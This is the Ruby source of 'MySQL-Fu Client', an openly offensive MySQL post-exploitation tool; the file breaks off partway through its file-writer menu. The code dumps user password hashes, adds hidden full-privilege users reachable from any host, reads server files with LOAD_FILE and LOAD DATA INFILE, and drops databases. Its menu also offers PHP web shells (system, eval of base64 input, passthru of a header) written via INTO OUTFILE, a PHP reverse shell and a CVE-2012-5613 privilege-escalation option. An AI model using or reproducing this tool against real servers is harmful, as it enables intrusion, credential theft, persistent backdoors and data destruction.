#!/usr/bin/env ruby
# MySQL-Fu Client
# Coded with Ruby 1.9 in mind
# By: MrGreen & H.R.
#
# DEMO VIDEO: http://youtu.be/Q3-dh73VG9I
#
require 'base64'
require 'optparse'
require 'net/http'
require 'rubygems'
require 'colorize'
require 'mysql'
# Also requires mysqldump commandline tool for the dumping options, its just straight good for most situations...

trap("SIGINT") { puts "\n\nWARNING! CTRL+C Detected, Disconnecting from DB and exiting program....".red ; @db.close if @db; exit 666; throw :ctrl_c }
catch :ctrl_c do
	class Clear
		def cls
			if RUBY_PLATFORM =~ /win32/ 
				system('cls')
			else
				system('clear')
			end
		end
	end
	options = {}
	optparse = OptionParser.new do |opts| 
		opts.banner = "Usage:".light_green + "#{$0} ".white + "[".light_green + "OPTIONS".white + "]".light_green
		opts.separator ""
		opts.separator "EX:".light_green + " #{$0} -H site.com -U root -P Sup3rs3ecr3t -D FunHouseDB".white
		opts.separator "EX:".light_green + " #{$0} --host 192.168.2.13 --username root --password sup3rs3cr3t".white
		opts.separator ""
		opts.separator "Options: ".light_green
		opts.on('-H', '--host <HOST>', "\n\tTarget MySQL Host to Connect to".white) do |host|
			options[:host] = host.sub('http://', '').sub('https://','').sub(/\/$/, '')
			@@host=host.sub('http://', '').sub('https://','').sub(/\/$/, '')
		end
		opts.on('-U', '--username <USER>', "\n\tMySQL Username to Connect as".white) do |myuser|
			options[:user] = myuser.chomp
			@@user=myuser.chomp
		end
		opts.on('-P', '--password <PASS>', "\n\tMySQL Password to use for Connectiong".white) do |mypass|
			options[:pass] = mypass.chomp
			@@pass=mypass.chomp
		end
		opts.on('-D', '--database <DB_NAME>', "\n\tMySQL Database to Connect to".white) do |rdb|
			options[:db] = rdb.chomp
			@@db=rdb.chomp
		end
		opts.on('-h', '--help', "\n\tHelp Menu".white) do 
			foo = Clear.new
			foo.cls 
			puts
			puts "MySQL-Fu Client".white
			puts "By: ".white + "MrGreen".light_green
			puts
			puts opts
			puts
			exit 69
		end
	end
	begin
		foo = ARGV[0] || ARGV[0] = "-h"
		optparse.parse!
		mandatory = [:host, :user, :pass]
		missing = mandatory.select{ |param| options[param].nil? }
		if not missing.empty?
			puts "Missing options: ".red + " #{missing.join(', ')}".white  
			puts optparse
			exit
		end
	rescue OptionParser::InvalidOption, OptionParser::MissingArgument
		foo = Clear.new
		foo.cls
		puts $!.to_s.red
		puts
		puts optparse
		puts
		exit 666;
	end

	class MyEnum
		def initialize
			foo = Clear.new
			foo.cls 
			puts
			puts "MySQL-Fu Client".white
			puts "By: ".white + "MrGreen".light_green
			puts
			begin
				@db = Mysql.connect("#{@@host}", "#{@@user}", "#{@@pass}")
				puts "w00t - ".white + "Connected to MySQL Server".light_green + "!".white
				query = @db.query('SELECT @@hostname;')
				query.each { |x| puts "Hostname: ".light_green + "#{x[0]}".white } 
				query = @db.query('SELECT user();')
				query.each { |x| puts "Loged in as: ".light_green + "#{x[0]}".white } 
				puts "Using Pass: ".light_green + "#{@@pass}".white
				query = @db.query('SELECT @@version;')
				query.each { |x| puts "MySQL Version: ".light_green + "#{x[0]}".white; @version = "#{x}"; } 
				query = @db.query('SELECT @@datadir;')
				query.each { |x| @@datadir = "#{x[0]}"; puts "Data Dir: ".light_green + "#{@@datadir}".white;  } 
				query = @db.query('SHOW VARIABLES;')
				query.each do |x, y|
					if "#{x}" == "version_compile_os" #We could have just done 'SELECT @@version_compile_os' instead of plucking.....
						if "#{y}" =~ /linux/
							@@os="#{y}" #Now we have OS var we can use this same if block to base OS attacks from....
							puts "Compiled on *nix:".light_green + " #{y}".white
						elsif "#{y}" =~ /windows/ or "#{y}" =~ /Win32/ or "#{y}" =~ /Win64/
							@@os="#{y}"
							puts "Compiled on Windows:".light_green + " #{y}".white
						else
							@@os="#{y}"
							puts "Compiled on:".light_green + " #{y}".white
						end
					end
				end
				puts
				main_menu
			rescue Mysql::Error => e
				puts
				puts "\t=> #{e}".red
				puts
				exit 68;
			end #end begin/rescue wrapper for main connection
		end
		#################### START MENU ########################
		def main_menu
			puts "Please enter the number for the option you want to run: ".light_green
			puts "0)".white + "   Get Me Out of Here!".light_green
			puts "1)".white + "   SHOW Available Database(s)".light_green
			puts "2)".white + "   SHOW Tables for Known Database".light_green
			puts "3)".white + "   SHOW Tables for All Databases".light_green
			puts "4)".white + "   SHOW Columns for Known Table & Database".light_green
			puts "5)".white + "   CREATE DB".light_green
			puts "6)".white + "   DROP DB".light_green
			puts "7)".white + "   DROP Table".light_green
			puts "8)".white + "   SHOW MySQL User Privileges".light_green
			puts "9)".white + "   SHOW MySQL Users, Passwords & Special Privileges".light_green
			puts "10a)".white + " CREATE New User w/Pass & GRANT Full Privileges".light_green			
			puts "10b)".white + " INSERT New User & Pass with full privileges to mysql.user".light_green
			puts "10c)".white + " DELETE MySQL DB User".light_green
			puts "11)".white + "  UPDATE Column Data of Known Database + Table".light_green
			puts "12a)".white + " READ File using LOAD_FILE()".light_green
			puts "12b)".white + " READ File using LOAD DATA INFILE + TEMP TABLE".light_green
			puts "13)".white + "  WRITE REMOTE Shell/File using INTO OUTFILE()".light_green
			puts "14)".white + "  WRITE LOCAL File 2 Remote Server via LOAD DATA LOCAL INFILE + TEMP TABLE + INTO OUTFILE".light_green
			puts "15)".white + "  Pentestmonkey's PHP Reverse Shell via LOAD DATA LOCAL INFILE + TEMP TABLE + INTO OUTFILE".light_green
			puts "16)".white + "  DROP to SQL Shell for Custom SQL Queries".light_green
			puts "17)".white + "  DROP to LOCAL OS Shell for running quick LOCAL commands".light_green
			puts "18)".white + "  DUMP Table".light_green
			puts "19)".white + "  DUMP Database".light_green
			puts "20)".white + "  DUMP All".light_green
			puts "21)".white + "  KINGCOPE - CVE-2012-5613: Linux MySQL Privilege Escalation".light_green
			begin
			case gets.chomp
				when "0"
					puts
					puts "Closing SQL-Fu Client Session".light_green + "...".white
					puts
					puts "Disconnected from Database".light_green + "!".white if @db
					puts
					puts "c ".light_green + "U".white + " L".light_green + "8".white + "r".light_green + "!".white if @db
					puts
					@db.close
					exit 69;
				when "1"
					#################### SHOW DB #####################
					begin
						puts
						puts "Available Databases".light_green + ":".white
						query = @db.query('SHOW DATABASES;')
						query.each { |x| puts "#{x[0]}".white }
						puts
						main_menu
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
						main_menu
					end #end begin/rescue wrapper
				when "2"
					############## SHOW TABLES 4 KNOWN DB ##############
					begin
						puts
						puts "Please provide the name of the Database to grab tables from".light_green + ":".white
						@dbName = gets.chomp
						puts
						@db.close
						@db = Mysql.connect("#{@@host}", "#{@@user}", "#{@@pass}", "#{@dbName}")
						puts "Tables for #{@dbName}".light_green + ": ".white
						query = @db.query('SHOW TABLES;')
						query.each { |x| puts "#{x[0]}".white }
						puts
						@db.close
						@db = Mysql.connect("#{@@host}", "#{@@user}", "#{@@pass}")
						main_menu
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
						main_menu
					end #end begin/rescue wrapper
				when "3"
					############### SHOW ALL TABLES 4 EACH DB ##############
					begin
						puts
						puts "ALL Tables by Database".light_green + ":".white
						query = @db.query('SHOW DATABASES;')

						@db.close
						query.each do |x|
						
							@db = Mysql.connect("#{@@host}", "#{@@user}", "#{@@pass}", "#{x[0]}")
							puts "Tables for #{x[0]}".light_green + ": ".white
							query = @db.query('SHOW TABLES;')
							query.each { |x| puts "#{x[0]}".white }
							puts
							@db.close

						end
						@db = Mysql.connect("#{@@host}", "#{@@user}", "#{@@pass}")

						puts
						main_menu
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
						main_menu
					end #end begin/rescue wrapper
				when "4"
					############## SHOW COLUMNS 4 KNOWN DB.TABLE ##############
					begin
						puts
						puts "Please provide the name of the Database to grab tables from".light_green + ":".white
						@dbName = gets.chomp
						puts
						@db.close
						@db = Mysql.connect("#{@@host}", "#{@@user}", "#{@@pass}", "#{@dbName}")
						puts "Tables for #{@dbName}".light_green + ": ".white
						query = @db.query('SHOW TABLES;')
						query.each { |x| puts "#{x[0]}".white }
						puts

						puts "Please provide the name of the Table to grab Columns from".light_green + ":".white
						@tblName = gets.chomp
						puts

						query = @db.query("SELECT count(*) FROM #{@tblName};")
						puts "Number of Entries in table:".light_green + " #{@tblName}".white
						query.each { |x| puts "#{x[0]}".white }
						puts

						query = @db.query("SHOW COLUMNS FROM #{@tblName};")
						puts "Columns for #{@tblName}".light_green + ": ".white
						query.each { |x, y| puts "#{x}".white }
						puts

						@db.close
						@db = Mysql.connect("#{@@host}", "#{@@user}", "#{@@pass}")
						main_menu
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
						main_menu
					end #end begin/rescue wrapper
				when "5"
					#################### CREATE DB #####################
					begin
						puts
						puts
						puts "Please provide the name of the Database to CREATE".light_green + ":".white
						@dbName = gets.chomp
						puts
						puts "Trying to Create a new database".light_green + ":".white
						query = @db.query("CREATE DATABASE IF NOT EXISTS #{@dbName};")
						puts "Creatied Database".light_green + "!".white
						puts
						puts "Updated Listing of Available Databases".light_green + ":".white
						query = @db.query('SHOW DATABASES;')
						query.each { |x| puts "#{x[0]}".white }
						puts
						main_menu
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
						main_menu
					end #end begin/rescue wrapper
				when "6"
					#################### DROP DB #####################
					begin
						puts
						puts
						puts "Please provide the name of the Database to DROP".light_green + ":".white
						@dbName = gets.chomp
						puts
						puts "Are you sure you want to DROP ".light_green + "#{@dbName}".white + " Drop from the records for good? (".light_green + "Y".white + "/".light_green + "N".white + ")".light_green
						answer = gets.chomp
						puts
						if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
							puts "Dropping Database:".light_green + "#{@dbName}".white
							query = @db.query("DROP DATABASE #{@dbName};")
							puts
							puts "Should be all set".light_green + "!".white
							puts
							puts "Available Databases".light_green + ":".white
							query = @db.query('SHOW DATABASES;')
							query.each { |x| puts "#{x[0]}".white }
						else
							puts
							puts "OK, aborting DROP request".light_green + "............".white
							puts
							puts "Returning to Main Menu".light_green + "...".white
							puts
							puts
							main_menu
						end
						puts
						main_menu
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
						main_menu
					end #end begin/rescue wrapper
				when "7"
					#################### DROP DB.TABLE #####################
					begin
						puts
						puts "Please provide the name of the Database Table is in".light_green + ":".white
						@dbName = gets.chomp
						puts
						@db.close
						@db = Mysql.connect("#{@@host}", "#{@@user}", "#{@@pass}", "#{@dbName}")
						puts "Tables for #{@dbName}".light_green + ": ".white
						query = @db.query('SHOW TABLES;')
						query.each { |x| puts "#{x[0]}".white }
						puts
						puts "Please provide the name of the Table to DROP".light_green + ":".white
						@tblName = gets.chomp
						puts
						puts "Are you sure you want to DROP ".light_green + "#{@tblName}".white + " Drop from the records for good? (".light_green + "Y".white + "/".light_green + "N".white + ")".light_green
						answer = gets.chomp
						puts
						if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
							puts "Dropping Table".light_green + " #{@tblName} ".white + "from ".light_green + " #{@dbName} ".white
							query = @db.query("DROP TABLE #{@tblName};")
							puts
							puts "Should be all set".light_green + "!".white
							puts
							puts "Tables for #{@dbName}".light_green + ": ".white
							query = @db.query('SHOW TABLES;')
							query.each { |x| puts "#{x[0]}".white }
							puts
						else
							@db.close
							@db = Mysql.connect("#{@@host}", "#{@@user}", "#{@@pass}")
							puts
							puts "OK, aborting DROP request".light_green + "............".white
							puts
							puts "Returning to Main Menu".light_green + "...".white
							puts
							puts
							main_menu
						end
						@db.close
						@db = Mysql.connect("#{@@host}", "#{@@user}", "#{@@pass}")
						puts
						main_menu
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
						main_menu
					end #end begin/rescue wrapper
				when "8"
					#################### SHOW PRIVS #####################
					begin
						puts "Current MySQL User Granted Privleges".light_green + ":".white
						query = @db.query("SHOW GRANTS FOR current_user();")
						query.each { |x| puts "#{x[0]}".white }
						puts

						puts "Do you want to try and see all user privs? (".light_green + "Y".white + "/".light_green + "N".white + ")".light_green
						answer = gets.chomp
						puts
						if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
							puts "MySQL User Privleges".light_green + ":".white
							query = @db.query("SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges")
							query.each do |x, y, z|
								if "#{z.upcase}" == "YES" or "#{z.upcase}" == "Y"
									puts "#{x}".white + " #{y}".blue + " #{z}".light_green
								end
							end
							puts
						end
						main_menu
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
						main_menu
					end #end begin/rescue wrapper
				when "9"
					#################### SHOW MYSQL USER INFO #####################
					begin
						puts "MySQL User Info".light_green + ":".white
						query = @db.query("SELECT CONCAT('USER: ',user,0x0a,'HOST: ',host,0x0a,'PASS: ',password,0x0a,'SUPER: ',super_priv,0x0a,'FILE: ',file_priv,0x0a,'CREATE USER: ',Create_user_priv,0x0a,'CREATE: ',create_priv,0x0a,'DROP: ',drop_priv,0x0a,'GRANT: ',grant_priv,0x0a,'INSERT: ',insert_priv,0x0a,'UPDATE: ',update_priv,0x0a) FROM mysql.user;")
						query.each { |x| puts "#{x[0]}".white }
						puts
						main_menu
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
						main_menu
					end #end begin/rescue wrapper
				when "10a"
					#################### INSERT NEW USER INTO mysql.user #####################
					puts
					puts "Please provide new username you would like to create".light_green + ": ".white
					@newUser = gets.chomp
					puts
					puts "Please provide password you would like to use for our new user #{@newUser}".light_green + ": ".white
					@newUserPass = gets.chomp
					puts
					begin
						puts "BEFORE CREATION".light_green + ": ".white
						query = @db.query('SELECT group_concat(0x0a,host,0x3a,user,0x3a,password,0x3a,Select_priv,0x3a,Insert_priv,0x3a,Update_priv,0x3a,Delete_priv,0x3a,Create_priv,0x3a,Drop_priv,0x3a,Reload_priv,0x3a,Shutdown_priv,0x3a,Process_priv,0x3a,File_priv,0x3a,Grant_priv,0x3a,References_priv,0x3a,Index_priv,0x3a,Alter_priv,0x3a,Show_db_priv,0x3a,Super_priv,0x3a,Create_tmp_table_priv,0x3a,Lock_tables_priv,0x3a,Execute_priv,0x3a,Repl_slave_priv,0x3a,Repl_client_priv,0x3a,Create_view_priv,0x3a,Show_view_priv,0x3a,Create_routine_priv,0x3a,Alter_routine_priv,0x3a,Create_user_priv,0x3a,ssl_type,0x3a,ssl_cipher,0x3a,x509_issuer,0x3a,x509_subject,0x3a,max_questions,0x3a,max_updates,0x3a,max_connections,0x3a,max_user_connections) FROM mysql.user;')
						query.each { |x| puts "#{x[0]}".white }
						puts
						puts "Confirm you want to move forward with NEW USER Creation? (".light_green + "Y".white + "/".light_green + "N".white + ")".light_green
						answer = gets.chomp
						puts
						if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
							puts "OK, Using CREATE to make a new user now".light_green + "......".white
							puts
							query = @db.query("CREATE USER '#{@newUser}'@'%' IDENTIFIED BY '#{@newUserPass}';")

							puts "OK, Using GRANT to extend full privileges to new user".light_green + "......".white
							puts
							query = @db.query("GRANT ALL PRIVILEGES ON *.* TO '#{@newUser}'@'%' IDENTIFIED BY '#{@newUserPass}' WITH GRANT OPTION;")
							query = @db.query('FLUSH PRIVILEGES;')

							puts "Finished".light_green + "!".white + "\nGoing to grab updated content to confirm for you".light_green + "......".white
							puts
							puts "AFTER INSERT".light_green + ": ".white
							query = @db.query('SELECT group_concat(0x0a,host,0x3a,user,0x3a,password,0x3a,Select_priv,0x3a,Insert_priv,0x3a,Update_priv,0x3a,Delete_priv,0x3a,Create_priv,0x3a,Drop_priv,0x3a,Reload_priv,0x3a,Shutdown_priv,0x3a,Process_priv,0x3a,File_priv,0x3a,Grant_priv,0x3a,References_priv,0x3a,Index_priv,0x3a,Alter_priv,0x3a,Show_db_priv,0x3a,Super_priv,0x3a,Create_tmp_table_priv,0x3a,Lock_tables_priv,0x3a,Execute_priv,0x3a,Repl_slave_priv,0x3a,Repl_client_priv,0x3a,Create_view_priv,0x3a,Show_view_priv,0x3a,Create_routine_priv,0x3a,Alter_routine_priv,0x3a,Create_user_priv,0x3a,ssl_type,0x3a,ssl_cipher,0x3a,x509_issuer,0x3a,x509_subject,0x3a,max_questions,0x3a,max_updates,0x3a,max_connections,0x3a,max_user_connections) FROM mysql.user;')
							query.each { |x| puts "#{x[0]}".white }
							puts
							puts "OK its done, but still not 100% the INSERT to mysql.db to GRANT them access is working. Try logging in as new user to actually confirm if it worked".light_green + ".......".white
							puts
						else
							puts "OK, returning to Main Menu then".light_green + ".......".white
							puts
						end
						puts
						main_menu
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
						main_menu
					end #end begin/rescue wrapper
				when "10b"
					#################### INSERT NEW USER INTO mysql.user #####################
					puts
					puts "Please provide new username you would like to create".light_green + ": ".white
					@newUser = gets.chomp
					puts
					puts "Please provide password you would like to use for our new user #{@newUser}".light_green + ": ".white
					@newUserPass = gets.chomp
					puts
					begin
						puts "BEFORE INSERT".light_green + ": ".white
						query = @db.query('SELECT group_concat(0x0a,host,0x3a,user,0x3a,password,0x3a,Select_priv,0x3a,Insert_priv,0x3a,Update_priv,0x3a,Delete_priv,0x3a,Create_priv,0x3a,Drop_priv,0x3a,Reload_priv,0x3a,Shutdown_priv,0x3a,Process_priv,0x3a,File_priv,0x3a,Grant_priv,0x3a,References_priv,0x3a,Index_priv,0x3a,Alter_priv,0x3a,Show_db_priv,0x3a,Super_priv,0x3a,Create_tmp_table_priv,0x3a,Lock_tables_priv,0x3a,Execute_priv,0x3a,Repl_slave_priv,0x3a,Repl_client_priv,0x3a,Create_view_priv,0x3a,Show_view_priv,0x3a,Create_routine_priv,0x3a,Alter_routine_priv,0x3a,Create_user_priv,0x3a,ssl_type,0x3a,ssl_cipher,0x3a,x509_issuer,0x3a,x509_subject,0x3a,max_questions,0x3a,max_updates,0x3a,max_connections,0x3a,max_user_connections) FROM mysql.user;')
						query.each { |x| puts "#{x[0]}".white }
						puts
						puts "Confirm you want to move forward with NEW USER Creation? (".light_green + "Y".white + "/".light_green + "N".white + ")".light_green
						answer = gets.chomp
						puts
						if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
							puts "OK, Using INSERT to create new user entry in MySQL user table now".light_green + "......".white
							puts
							#Insert to mysql.user where shit is stored
							query = @db.query("INSERT INTO mysql.user (Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections) VALUES('%','#{@newUser}',PASSWORD('#{@newUserPass}'),'Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y');")

							#Insert into mysql.db for GRANT overrides....working?
							query = @db.query("INSERT INTO mysql.db (Host,Db,User,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Create_tmp_table_priv,Lock_tables_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Execute_priv)  VALUES('%','test','#{@newUser}','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y');")

							#Flush privs to update user privs so they take affect...
							query = @db.query('FLUSH PRIVILEGES;')
							puts "OK, going to grab updated content to confirm for you".light_green + "......".white
							puts
							puts "AFTER INSERT".light_green + ": ".white
							query = @db.query('SELECT group_concat(0x0a,host,0x3a,user,0x3a,password,0x3a,Select_priv,0x3a,Insert_priv,0x3a,Update_priv,0x3a,Delete_priv,0x3a,Create_priv,0x3a,Drop_priv,0x3a,Reload_priv,0x3a,Shutdown_priv,0x3a,Process_priv,0x3a,File_priv,0x3a,Grant_priv,0x3a,References_priv,0x3a,Index_priv,0x3a,Alter_priv,0x3a,Show_db_priv,0x3a,Super_priv,0x3a,Create_tmp_table_priv,0x3a,Lock_tables_priv,0x3a,Execute_priv,0x3a,Repl_slave_priv,0x3a,Repl_client_priv,0x3a,Create_view_priv,0x3a,Show_view_priv,0x3a,Create_routine_priv,0x3a,Alter_routine_priv,0x3a,Create_user_priv,0x3a,ssl_type,0x3a,ssl_cipher,0x3a,x509_issuer,0x3a,x509_subject,0x3a,max_questions,0x3a,max_updates,0x3a,max_connections,0x3a,max_user_connections) FROM mysql.user;')
							query.each { |x| puts "#{x[0]}".white }
							puts "OK its done, but you still not 100% the INSERT to mysql.db to GRANT them access is working".light_green + ".......".white
						else
							puts "OK, returning to Main Menu then".light_green + ".......".white
							puts
						end
						puts
						main_menu
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
						main_menu
					end #end begin/rescue wrapper
				when "10c"
					#################### DELETE USER FROM mysql.user #####################
					puts
					puts "Current MySQL Users & Host Info".light_green + ": ".white
					query = @db.query('SELECT group_concat(0x0a,host,0x3a,user) FROM mysql.user;')
					query.each { |x| puts "#{x[0]}".white }
					puts
					puts "Which USER do you want to DELETE".light_green + ": ".white
					@duser = gets.chomp
					puts
					puts "Provide HOST entry for provided USER to DELETE".light_green + ": ".white
					@dhost = gets.chomp
					puts
					puts "Confirm you want to move forward with DELETE for '".light_green + "#{@duser}".white + "'@'".light_green + "#{@dhost}".white + "' entry: (".light_green + "Y".white + "/".light_green + "N".white + ")".light_green
					answer = gets.chomp
					puts
					if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
						puts "OK, issuing DELETE request".light_green + ".......".white
						puts
						begin
							query = @db.query('USE mysql;')
							query = @db.query("DROP USER '#{@duser}'@'%';")
							query = @db.query('FLUSH PRIVILEGES;')
						rescue Mysql::Error => e
							puts
							puts "\t=> #{e}".red
							puts
							main_menu
						end #end begin/rescue wrapper
						puts
						puts "Updated MySQL Users & Host Info".light_green + ": ".white
						query = @db.query('SELECT group_concat(0x0a,host,0x3a,user) FROM mysql.user;')
						query.each { |x| puts "#{x[0]}".white }
						puts
					else
						puts "OK, returning to Main Menu then".light_green + ".......".white
						puts
					end
					puts
					main_menu
				when "11"
					#################### UPDATE DATA IN KNOWN COLUMN/FIELDS #####################
					puts
					puts "Provide DB you want to make UPDATES in".light_green + ": ".white
					@dbName = gets.chomp
					puts
					puts "Provide the TABLE name you wnat to make UPDATES in".light_green + ": ".white
					@tblName = gets.chomp
					puts
					puts "How many Columns do we need to UPDATE values for? ".light_green + "(".white + "#NUMBER".light_green + ")".white
					@clnumz = gets.chomp
					puts
					puts "OK, let's get that Column info".light_green + ".....".white
					puts
					begin
						@count=0
						@clz=[]
						while "#{@count}".to_i < "#{@clnumz}".to_i
							puts "Provide COLUMN#{@count} to UPDATE".light_green + ": ".white
							clName = gets.chomp
							puts

							puts "Provide NEW COLUMN#{@count} VALUE".light_green + ": ".white
							clValue = gets.chomp
							puts

							@clz << "#{clName}='#{clValue}'"
							@count += 1
						end
						puts "Provide condition for our WHERE clause ".light_green + "(".white + "i.e. user=admin, id='1', name=\"Peggy\", etc.".light_green + ")".white + ": ".light_green 
						@where = gets.chomp
						puts
						# UPDATE table_name SET field1=new-value1, field2=new-value2 [WHERE Clause]
						@prep = "UPDATE #{@tblName} SET "
						#count top down so padding of SQL Statement from column array works properly, dont want extra commans :p
						@clz.each do |columnset|
							if @count.to_i > 1
								@prep += "#{columnset}, "
							else
								@prep += "#{columnset} "
							end
							@count -= 1 
						end
						@prep += "WHERE #{@where};"
						puts
						puts "BEFORE UPDATE".light_green + ": ".white
						query = @db.query("USE #{@dbName};")
						query = @db.query("SELECT * FROM #{@tblName} WHERE #{@where};")
						query.each { |x| puts "#{x[0]}".white }
						puts
						puts "Please confirm this UPDATE statement looks correct before we execute".light_green + ": ".white
						puts "SQL UPDATE: ".green + "#{@prep}".white
						puts
						puts "Does this look good? (".light_green + "Y".white + "/".light_green + "N".white + ")".light_green
						answer = gets.chomp
						puts
						if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
							puts
							puts "Now making UPDATE request".light_green + "......".white
							puts
							query = @db.query("USE #{@dbName};")
							query = @db.query("#{@prep}")
							puts "AFTER UPDATE".light_green + ": ".white
							query = @db.query("SELECT * FROM #{@tblName} WHERE #{@where};")
							query.each { |x| puts "#{x[0]}".white }
							puts
							puts "Hope things worked, if not you can try dropping to SQL Shell from Main Menu".light_green + "......".white
							puts
							puts "Returning to Main Menu".light_green + "...".white
							puts
							main_menu
						else
							puts
							puts "OK, aborting UPDATE request".light_green + "............".white
							puts
							puts "Returning to Main Menu".light_green + "...".white
							puts
							puts
							main_menu
						end
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
						main_menu
					end #end begin/rescue wrapper
				when "12a"
					#################### MYSQL FILE READER #####################
					puts
					puts "Dropping to SQL File Reader Shell, just tell it what file to read".light_green + "...".white
					puts
					begin
						foo=0
						while "#{foo}".to_i < 1
							begin
								print "SQL".light_green + "(".white + "File_Reader".light_green + ")".white + "> ".light_green
								@cmd = gets.chomp
								puts
								if "#{@cmd.upcase}" == "EXIT" or "#{@cmd.upcase}" == "QUIT"
									puts "Exiting SQL File Reader Shell session".light_green + "......".white
									puts
									puts
									break;#Get out of the loop
								end
								query = @db.query("SELECT LOAD_FILE('#{@cmd}');")
								query.each do |x|
									puts "#{x[0]}".white;
									@rez = "#{x[0]}"
								end
								#Results folder for our dumps....
								@resDir = "#{@@host}"
								rezFile="#{@resDir}/#{@cmd.gsub('/', '_')}"
								Dir.mkdir(@resDir) unless File.exists?(@resDir)
								foofucker = File.open("#{rezFile}", "w+")
								foofucker.puts "#{@rez}"
								foofucker.close
							rescue
								puts "Oops, an error was encountered with your last request".light_red + "!".white
								puts "Error Code: ".light_red + "#{@db.errno}".white
								puts "Error Message: ".light_red + "#{@db.error}".white
								puts
							end#end rescue wrapper
						end#End of SQL Shell Loop
						puts
						main_menu
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
						main_menu
					end #end begin/rescue wrapper
				when "12b"
					#################### MYSQL FILE READER II #####################
					puts
					puts "Dropping to SQL File Reader-II Shell, just tell it what file to read".light_green + "...".white
					puts
					begin
						foo=0
						while "#{foo}".to_i < 1
							begin
								print "SQL".light_green + "(".white + "File_Reader2".light_green + ")".white + "> ".light_green
								@local = gets.chomp
								puts
								if "#{@local.upcase}" == "EXIT" or "#{@local.upcase}" == "QUIT"
									puts "Exiting SQL File Reader Shell session".light_green + "......".white
									puts
									puts
									break;#Get out of the loop
								end
								#Read target file into temp table on temp database we create
								query = @db.query('DROP DATABASE IF EXISTS fooooooooooooooofucked;')
								query = @db.query('CREATE DATABASE fooooooooooooooofucked;')
								query = @db.query('USE fooooooooooooooofucked;')
								query = @db.query("CREATE TEMPORARY TABLE fooread (content LONGTEXT);")
								query = @db.query("LOAD DATA INFILE '#{@local}' INTO TABLE fooread;")

								#Results folder for our dumps....
								@resDir = "#{@@host}"
								rezFile="#{@resDir}/#{@local.gsub('/', '_')}"
								Dir.mkdir(@resDir) unless File.exists?(@resDir)
								foofucker = File.open("#{rezFile}", "w+")
								@rez=[]
								query = @db.query("SELECT * FROM fooread;")
								query.each do |x|
									puts "#{x[0]}".white
									@rez << "#{x[0]}"
								end
								foofucker.puts "#{@rez.join("\n")}"
								foofucker.close

								query = @db.query('DROP TEMPORARY TABLE fooread;')
								query = @db.query('DROP DATABASE fooooooooooooooofucked;')
								puts
							rescue
								puts "Oops, an error was encountered with your last request".light_red + "!".white
								puts "Error Code: ".light_red + "#{@db.errno}".white
								puts "Error Message: ".light_red + "#{@db.error}".white
								puts
							end#end rescue wrapper
						end#End of SQL Reader2 Shell Loop
						puts
						main_menu
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
						main_menu
					end #end begin/rescue wrapper
				when "13"
					#################### MYSQL FILE WRITER #####################
					puts
					puts "Please provide path to writable location".light_green + ": ".white
					@path = gets.chomp
					puts
					puts "Please provide name to use for new file ".light_green + "(".white + "blah".light_green + ".".white + "php, 1234".light_green + ".".white + "php, fuqu".light_green + ".".white + "php, etc".light_green + ")".white + ": ".light_green
					@fname = gets.chomp
					puts
					puts "Please Choose From the File Write Options Below".light_green + ":".white
					puts "0)".white + " Return to Main Menu".light_green
					puts "1)".white + " Custom Code".light_green
					puts "2)".white + " PHP System($_GET['foo']) Shell".light_green
					puts "3)".white + " PHP Eval(Base64($_REQUEST['x'])) Shell".light_green
					puts "4)".white + " PHP Passthru(Base64($_SERVER[HTTP_CMD])) Shell".light_green
					puts "5)".white + " PHP Create_function(Base64($_SERVER[HTTP_CMD])) Shell".light_green
					case gets.chomp
						when "0"
							puts
							puts "Returning to Main Menu".light_red + "......".white
							puts
							main_menu
						when "1"
						#################### MYSQL FILE WRITER - CUSTOM CODE #####################
							begin
								puts "Please type your code to write below ".light_green + "(".white + "i".light_green + ".".white + "e".light_green + ".".white + " <?php passthru($_POST[\\'cmd\\']); ?>".cyan + ")".white + ":".light_green
								@code = gets.chomp
								puts

								puts "Writing custom code to: ".light_green + "#{@path}#{@fname}".white
								puts "You sure you want to write here? (".light_green + "Y".white + "/".light_green + "N".white + ")".light_green
								answer = gets.chomp
								puts
								if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
									puts "OK, Trying to write file".light_green + ".......".white
									puts
